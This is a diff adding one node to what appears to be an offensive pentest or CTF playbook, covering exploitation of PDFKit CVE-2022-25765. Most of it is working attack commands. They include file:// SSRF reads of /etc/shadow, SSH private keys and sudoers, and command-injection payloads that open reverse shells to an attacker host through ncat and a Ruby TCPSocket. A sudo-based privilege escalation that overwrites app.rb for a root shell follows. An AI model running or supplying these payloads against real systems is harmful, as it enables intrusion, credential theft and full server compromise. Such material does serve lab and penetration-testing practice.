@@ -1,0 +1,30 @@
+{
+  "id": "pdfkit_rce",
+  "phase": "WEB",
+  "title": "PDFKit — CVE-2022-25765 Command Injection + SSRF File Read",
+  "body": "PDFKit is a Ruby gem that wraps wkhtmltopdf to convert HTML/URLs to PDF. CVE-2022-25765 affects PDFKit < 0.8.7.2 — the URL parameter passed to wkhtmltopdf is not sanitised, allowing command injection via URL-encoded newlines or backticks. The patch in 0.8.7 was incomplete; 0.8.7.2 is the real fix.\n\nFingerprint: WEBrick on an unusual port (3000, 8080), app title 'HTML to PDF', error message 'PDFKit::ImproperWkhtmltopdfExitStatus' when you send a bad URL. That error is a free CVE handoff — it names the gem.\n\nTwo attack surfaces: (1) command injection via the URL parameter (RCE as the web app user), and (2) SSRF via file:// protocol to read arbitrary files on the server (useful when the app user has access to sensitive files or the sudoers file).",
+  "cmd": "# ══════════════════════════════════════════════════\n# 1 — FINGERPRINT\n# ══════════════════════════════════════════════════\n# nmap shows: WEBrick httpd 1.7.0 (Ruby 3.x.x)\n# Browser title: 'HTML to PDF' or similar\n# Trigger the error — send a bad URL:\ncurl -s -X POST http://<IP>:<PORT>/pdf -d 'url=ssdnf' | head -30\n# Look for: PDFKit::ImproperWkhtmltopdfExitStatus\n# and the wkhtmltopdf command in the backtrace — confirms the gem + version.\n\n# Check the gem version from the error backtrace or:\ncurl -s http://<IP>:<PORT>/ | grep -i 'pdfkit\\|wkhtmltopdf\\|version'\n\n# ══════════════════════════════════════════════════\n# 2 — SSRF: file:// local file read (no CVE needed)\n# ══════════════════════════════════════════════════\n# wkhtmltopdf follows file:// URLs by default — no injection required.\n# Works on ALL versions, not just vulnerable ones.\ncurl -s -X POST http://<IP>:<PORT>/pdf -d 'url=file:///etc/passwd' -o out.pdf\npdftotext out.pdf -          # extract text from the PDF\n\n# High-value targets:\ncurl -s -X POST http://<IP>:<PORT>/pdf -d 'url=file:///root/.ssh/id_rsa' -o id_rsa.pdf\ncurl -s -X POST http://<IP>:<PORT>/pdf -d 'url=file:///etc/shadow' -o shadow.pdf\ncurl -s -X POST http://<IP>:<PORT>/pdf -d 'url=file:///home/<USER>/.ssh/id_rsa' -o id_rsa.pdf\ncurl -s -X POST http://<IP>:<PORT>/pdf -d 'url=file:///etc/sudoers' -o sudoers.pdf\n# Read the PDF and extract the content to Kali:\npdftotext out.pdf -\n\n# ══════════════════════════════════════════════════\n# 3 — CVE-2022-25765: command injection (< 0.8.7.2)\n# ══════════════════════════════════════════════════\n# The URL is passed to wkhtmltopdf unsanitised.\n# Injection via URL-encoded space+backtick: %20`<cmd>`\n# The command runs in a subshell as the app user.\n\n# Method A — curl direct injection (listener on LPORT):\ncurl -s -X POST http://<IP>:<PORT>/pdf \\\n  --data-urlencode 'url=http://anything%20`ncat -e /bin/bash <LHOST> <LPORT>`'\n\n# Method B — the PoC from shamo0/PDFkit-CMD-Injection:\n# Payload embeds in the URL field:\n# url=http://%20`ruby -rsocket -e'spawn(\"sh\",[[:in,:out,:err]]=>\nTCPSocket.new(\"<LHOST>\",<LPORT>))'`\ncurl -X POST http://<IP>:<PORT>/pdf \\\n  --data-urlencode $'url=http://\\x20`ruby -rsocket -e\\'spawn(\"sh\",[[: in,:out,:err]]=>TCPSocket.new(\"<LHOST>\",<LPORT>))\\'`'\n\n# Simplest working payload (nc with -e):\ncurl -X POST http://<IP>:<PORT>/pdf \\\n  -d 'url=http://%20`ncat+-e+/bin/bash+<LHOST>+<LPORT>`'\n\n# ══════════════════════════════════════════════════\n# 4 — VERIFY / catch the shell\n# ══════════════════════════════════════════════════\n# Listener up BEFORE sending the payload:\nnc -lvnp <LPORT>\n# Shell arrives as the app user (often same as file owner of app.rb)\n# Upgrade immediately: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# ══════════════════════════════════════════════════\n# 5 — POST-SHELL: check sudo (common path to root)\n# ══════════════════════════════════════════════════\nsudo -l\n# Common finding: (ALL) NOPASSWD: /usr/bin/ruby /home/<user>/app/app.rb\n# If app.rb is WRITABLE by you:\necho 'exec \"/bin/bash\"' > /home/<user>/app/app.rb\nsudo /usr/bin/ruby /home/<user>/app/app.rb\n# = instant root shell (see sudo_check node for full argument-locked detail)",
+  "warn": "The file:// SSRF works on ALL PDFKit versions — it's a wkhtmltopdf default, not a CVE. The command injection (CVE-2022-25765) requires < 0.8.7.2; the 0.8.7 patch was incomplete so 0.8.7.0 and 0.8.7.1 are still vulnerable. If the app has client-side URL validation, trigger an error first (send a bad URL like 'ssdnf') — the error bypasses the JS validation and confirms the backend gem. The app.rb overwrite is only available when you own the file — check ls -la before assuming you can write it.",
+  "choices": [
+    {
+      "label": "Got a shell — upgrade + check sudo",
+      "next": "sudo_check"
+    },
+    {
+      "label": "File read — found SSH key",
+      "next": "ssh_key"
+    },
+    {
+      "label": "File read — found creds in config/sudoers",
+      "next": "creds_found"
+    },
+    {
+      "label": "Argument-locked sudo rule → writable script",
+      "next": "sudo_check"
+    },
+    {
+      "label": "Back to web enum",
+      "next": "web_enum"
+    }
+  ]
+}
